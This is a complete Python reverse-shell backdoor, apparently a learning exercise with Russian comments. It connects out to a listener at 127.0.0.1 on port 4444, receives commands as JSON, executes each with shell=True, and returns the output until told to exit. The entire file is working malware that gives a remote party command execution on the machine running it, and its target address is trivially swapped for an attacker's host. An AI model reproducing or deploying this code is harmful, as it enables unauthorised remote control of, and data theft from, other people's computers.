#!/usr/bin/python
import socket
import subprocess as sb
import json


def execute_system_command(command):
    return sb.check_output(command[0], shell=True)


class Backdoors:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_sehd(self, data):
        # Метод упаковки данных в json формат для точной передачи данных.
        json_data = json.dumps(data)  # Создаем переменую в которую будем упаковывать данные.
        self.connection.send(json_data.encode('utf-8'))  # Отправляем упакованые данные .

    def reliable_recv(self):
        # Метод распаковки полученых данных.
        json_data = ''  # Создаем пустую переменую,для работы с ней в цикле.
        while True:  # Обьявляем бесконечный цикл.
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.reliable_recv()
            if command[0] == "exit":
                self.connection.close()  # Закываем соединение.
                exit()  # Закрываем программу.
            else:
                print(command)
                command_result = execute_system_command(command)
                self.reliable_sehd(command_result)


my_backdoor = Backdoors('127.0.0.1', 4444)
my_backdoor.run()
